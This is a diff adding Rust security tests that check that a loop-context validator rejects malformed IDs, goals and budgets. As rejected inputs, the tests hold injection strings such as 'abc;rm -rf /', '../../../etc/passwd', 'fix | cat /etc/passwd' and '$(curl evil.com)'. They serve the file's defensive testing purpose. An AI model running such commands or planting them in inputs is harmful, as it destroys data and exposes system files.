@@ -181,3 +181,124 @@ fn test_hook_json_escaping_quotes_and_newlines() {
         assert!(parsed["hookSpecificOutput"]["updatedResponse"].is_string());
     }
 }
+
+// ─── L4-02: Loop Context Security Tests ──────────────────────
+
+#[test]
+fn test_loop_id_injection_rejected() {
+    use omni::guard::env::{ValidationError, validate_loop_context};
+
+    // Shell metacharacters in loop_id
+    assert_eq!(
+        validate_loop_context(Some("abc;rm -rf /"), None, None),
+        Err(ValidationError::InvalidLoopId)
+    );
+
+    // Path traversal attempt
+    assert_eq!(
+        validate_loop_context(Some("../../../etc/passwd"), None, None),
+        Err(ValidationError::InvalidLoopId)
+    );
+
+    // Too long (65 chars)
+    let long_id = "a".repeat(65);
+    assert_eq!(
+        validate_loop_context(Some(&long_id), None, None),
+        Err(ValidationError::InvalidLoopId)
+    );
+
+    // Valid IDs pass
+    assert!(validate_loop_context(Some("abc-123-def"), None, None).is_ok());
+    assert!(validate_loop_context(Some("loop42"), None, None).is_ok());
+    // Max length (64 chars) passes
+    let max_id = "a".repeat(64);
+    assert!(validate_loop_context(Some(&max_id), None, None).is_ok());
+}
+
+#[test]
+fn test_goal_shell_metachar_sanitized() {
+    use omni::guard::env::{ValidationError, validate_loop_context};
+
+    let dangerous_goals = vec![
+        "fix this; echo pwned",
+        "fix $(whoami)",
+        "fix `id`",
+        "fix | cat /etc/passwd",
+        "fix & background",
+        "fix > /dev/null",
+        "fix < input.txt",
+        "fix (subshell)",
+        "fix ) close",
+    ];
+
+    for goal in dangerous_goals {
+        assert_eq!(
+            validate_loop_context(None, Some(goal), None),
+            Err(ValidationError::GoalContainsShellMetachars),
+            "Goal '{}' should be rejected",
+            goal
+        );
+    }
+
+    // Clean goals pass
+    assert!(validate_loop_context(None, Some("fix the auth tests"), None).is_ok());
+    assert!(validate_loop_context(None, Some("implement feature-123"), None).is_ok());
+}
+
+#[test]
+fn test_goal_too_long_rejected() {
+    use omni::guard::env::{ValidationError, validate_loop_context};
+
+    let long_goal = "a".repeat(501);
+    assert_eq!(
+        validate_loop_context(None, Some(&long_goal), None),
+        Err(ValidationError::GoalTooLong)
+    );
+
+    // Exactly 500 passes
+    let max_goal = "a".repeat(500);
+    assert!(validate_loop_context(None, Some(&max_goal), None).is_ok());
+}
+
+#[test]
+fn test_budget_overflow_clamped() {
+    use omni::guard::env::{ValidationError, validate_loop_context};
+
+    assert_eq!(
+        validate_loop_context(None, None, Some(10_000_001)),
+        Err(ValidationError::BudgetTooLarge)
+    );
+
+    // u64 overflow attempt
+    assert_eq!(
+        validate_loop_context(None, None, Some(u64::MAX)),
+        Err(ValidationError::BudgetTooLarge)
+    );
+
+    // Max valid budget passes
+    assert!(validate_loop_context(None, None, Some(10_000_000)).is_ok());
+
+    // Zero budget is fine
+    assert!(validate_loop_context(None, None, Some(0)).is_ok());
+    assert!(validate_loop_context(None, None, None).is_ok());
+}
+
+#[test]
+fn test_malicious_mcp_params_rejected() {
+    use omni::guard::env::validate_loop_context;
+
+    // Combined attack: all fields malicious
+    assert!(
+        validate_loop_context(
+            Some(";drop table"),
+            Some("$(curl evil.com)"),
+            Some(u64::MAX)
+        )
+        .is_err()
+    );
+
+    // All fields valid
+    assert!(
+        validate_loop_context(Some("valid-loop-id"), Some("fix the tests"), Some(100_000)).is_ok()
+    );
+}
